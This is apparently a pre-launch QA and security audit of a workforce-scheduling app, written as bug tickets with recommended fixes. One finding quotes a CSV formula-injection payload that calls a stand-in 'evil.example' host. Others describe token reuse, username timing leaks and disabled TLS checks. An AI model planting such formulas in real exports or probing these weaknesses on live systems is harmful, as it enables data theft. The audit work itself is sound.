Title: A disabled user's existing session keeps working
Steps: Create user → sign in (token) → admin sets status DISABLED → call GET /api/v1/workforce/employees with the old token
Actual: 200 OK — the token works until it expires (JWT_TTL=12h). New sign-ins are refused correctly.
Evidence: api-functional › Audit & Administration (existing session of disabled user is cut off → 200)
Recommended fix: In authenticate(), reject tokens whose user is no longer ACTIVE (cache status in Redis for a few seconds), or keep a per-user token version and bump it on disable/role change/password reset.

Title: Forecast/schedule engine crashes with a native abort inside the CP-SAT solver, and stays down
Steps: Seen twice: (1) during scripts/demo-seed.mjs (forecast → schedule); (2) during the gateway's own test run, seconds after 'cancel stops a running build inside the engine' passed, while the next multi-group solve ran
Expected: A failed solve fails that one request; the engine keeps serving
Actual: 'Fatal Python error: Aborted' in ortools cp_model.Solve (backend/engine/scheduling.py:465, solve_cpsat) with the new cancel watchdog thread (scheduling.py:459, solver.StopSearch from another thread) alive. The whole process dies: every forecast and schedule request then returns 503 until someone restarts it. Earlier dead engines also left 3 hung server.py processes (each with 4 workers) running. Not reproduced on demand: 3 rounds of start → cancel → solve passed
Evidence: engine-crash-1.log (native stack of all threads); gateway-suite.txt (12 tests failed with ENGINE_UNAVAILABLE after the crash); /health engine:false
Recommended fix: Run each CP-SAT solve in a child process (the ProcessPool already exists) so a native abort kills one job, not the server; re-check the uncommitted StopSearch-from-watchdog change (prefer a solution-callback stop or the solver's own time limit); run the engine under a supervisor that restarts it and kills the whole process tree; alert on /health engine:false.

Title: Admin can book overlapping time off for the same person
Steps: POST /workforce/time-off for an employee (15–16 days out), approve → POST another for days 16–17
Expected: 400/409 overlap (self-service already blocks this: 'You already have … that overlaps these dates')
Actual: 201 Created — double-booked leave, double-counted balance and pay
Recommended fix: Run the same overlap check used by POST /me/time-off inside POST /workforce/time-off (and in bulk/import paths).

Title: Administrator uses a password on the app's own blocklist and is never asked to change it
Expected: Strong password; temporary/bootstrap passwords force a change
Actual: Password is in EASY list of passwordPolicy.ts and contains the username; mustChangePassword=false
Recommended fix: Rotate before go-live. Apply checkNewPassword() to BOOTSTRAP_ADMIN_PASSWORD and set must_change_password=true for the bootstrap admin.

Title: Ctrl+K search shows fake prototype records and cannot find real ones
Actual: 'Jane Doe · EMP-1024 · Customer Billing' (does not exist); real group and screen names: 'No matching records'
Evidence: admin-e2e A-04, screens/palette-fake-data.png; src/components/common/CommandPalette.tsx uses SEED_EMPLOYEES/SEED_WFM_GROUPS/SEED_SKILLS from src/services/wfmStore.ts
Recommended fix: Search the API (or the loaded stores) and the route list; delete the SEED_* data from the production bundle.

Title: Admin sidebar cannot be used with a keyboard or screen reader
Steps: Load any admin screen → press Tab repeatedly
Actual: Only 1 focus stop in the sidebar in 40 Tabs — items are <div onClick> with no role or tabindex
Recommended fix: Render items as <a href> (they already have URLs) or <button>, with aria-current on the active one.

Title: Icon-only buttons have no accessible name on every admin screen (WCAG 4.1.2, critical)
Steps: axe-core WCAG 2.1 AA scan of all 51 admin screens
Actual: button-name: 530 elements on 51/51 screens; plus select-name and missing form labels on one screen
Recommended fix: Add aria-label to icon buttons (lucide icons inside <button>), label selects/inputs.

Title: AG Grid Enterprise runs without a licence key
Actual: Console prints the AG Grid Enterprise licence banner; grids show the trial watermark
Evidence: admin-crawl console errors on Employees, Time Off, Attendance, Timeline, Live coverage, Activities
Recommended fix: Set VITE_AG_GRID_LICENSE for the production build (or switch to the Community edition). Using Enterprise in production unlicensed breaches the licence.

Title: CSV formula injection in the audit export
Actual: Written raw: "=HYPERLINK(""http://evil.example/…"")" — runs when opened in Excel
Recommended fix: Reuse csvCell from modules/reports.ts (prefix = + - @ with ') in auditRoutes.ts and integrations/runner.ts and any other CSV writer.

Title: Session token accepted in the URL (?token=) on every REST route
Actual: 200; the web app also opens /ws?token=<jwt>
Recommended fix: Accept ?token= only on the WebSocket upgrade, ideally with a short-lived single-use ticket instead of the session JWT; strip it from access logs.

Title: Response time reveals whether a username exists
Steps: POST /auth/login with a wrong password for a real vs an unknown username (5 each)
Actual: Real user median ≈ 808 ms, unknown ≈ 11 ms (bcrypt only runs for real users)
Recommended fix: When no user is found, bcrypt.compare against a fixed dummy hash before failing.

Title: Impossible calendar date returns 500 and leaks the PostgreSQL error
Actual: 500 'date/time field value out of range: "2026-02-30"'
Recommended fix: isoDay is a regex only — add a real-date refine to the shared isoDay schema (affects every date input), and never return raw DB messages on 500.

Title: Failed sign-in attempts are not written to the audit log
Steps: Fail a sign-in for admin → search audit
Actual: Only successful LOGIN is audited (lockouts are in Redis only)
Recommended fix: Audit failed attempts and lockouts (needed for SOC 2 / ISO 27001 evidence).

Title: Forecast Builder takes ~34 s to finish loading
Steps: Open /forecasting/forecast-builder for Demo Support (10 weeks of history, one queue)
Actual: GET /forecast/history-quality takes 15–32 s and is requested twice on every load
Recommended fix: Cache history-quality per group/version, compute it in the background, and de-duplicate the request in the screen.

Title: Admin JavaScript is a single 4.2 MB chunk (1.18 MB gzipped)
Expected: Route-level code splitting, main chunk < 500 kB
Actual: index.js 4,234 kB + exceljs 940 kB; Vite warns about chunk size
Recommended fix: Lazy-load each module screen (React.lazy) and exceljs/recharts/ag-grid only where used.

Title: Employee list is not paginated
Actual: 328 kB per call; 40 req/s with p95 627 ms at 25 concurrent
Recommended fix: Server-side paging and field selection; the grid can use the AG Grid server-side row model.

Title: Portal is not usable on a phone browser
Actual: Fixed 224 px sidebar leaves 188 px for content; Schedule scrolls sideways
Recommended fix: Collapse the sidebar into a bottom tab bar under md breakpoint (same IA as the mobile app).

Title: Colour contrast below WCAG AA on every screen of both apps
Actual: 822 elements on 51/51 admin screens; portal login and 4/5 sections
Recommended fix: Darken #A3A3A3/#737373 secondary text on white/#FAFAF8 backgrounds.

Title: NATS TLS certificate checking is switched off
Actual: false
Recommended fix: Set to true with a trusted CA for production.

Title: Offers show an empty group name to the employee
Actual: groupName ""
Recommended fix: Join the group name in the /me/offers query.

Title: No URLs per section: reload always returns to Home, Back leaves the app
Expected: Stay on Inbox (admin app already has per-screen URLs)
Actual: Back on Home; nothing can be bookmarked or linked from a notification e-mail
Recommended fix: Use the same History-API routing as src/services/routes.ts.

Title: Time-off form accepts end-before-start until it is submitted
Steps: Request time off → Start = day 60, End = day 55
Actual: Submit enabled; the server's 400 message is shown afterwards
Recommended fix: Validate in the form (it already pre-checks overlaps).

Title: Hire date in 2099 is accepted
Recommended fix: Bound hire dates.

Title: Malformed JSON returns error code INTERNAL
Actual: 400 with code INTERNAL
Recommended fix: Map body-parser SyntaxError to a 400 BAD_REQUEST code.

Title: Unauthenticated endpoints reveal account existence and organisation name
Actual: Returns the organisation for a real e-mail, [] otherwise (rate-limited 15 per 15 min)
Recommended fix: Set LOGIN_DISCOVERY=false for production if the org code is distributed another way.

Title: No favicon — 404 on every page load
Actual: 404 (console error on every screen)
Recommended fix: Add a favicon to public/.

Title: scripts/demo-seed.mjs cannot finish
Steps: Run the seed on a stack with FORCE_PASSWORD_CHANGE on (the default)
Actual: The giveaway step gets 403 'Choose a new password' (new logins are temporary), and a failed step leaves the group behind so the seed refuses to run again
Recommended fix: Change the demo logins' passwords in the seed; make the seed resumable.

Title: Existing data to clean before go-live
Steps: Configuration › Integration Station; Data Management › Staged imports
Actual: A connector points at nats://192.168.9.81:4222 (TIMEOUT); 6 failed history imports (672–5,000 rows rejected); test employees EXT7172 etc.
Recommended fix: Start production from a clean database; do not migrate this test data.
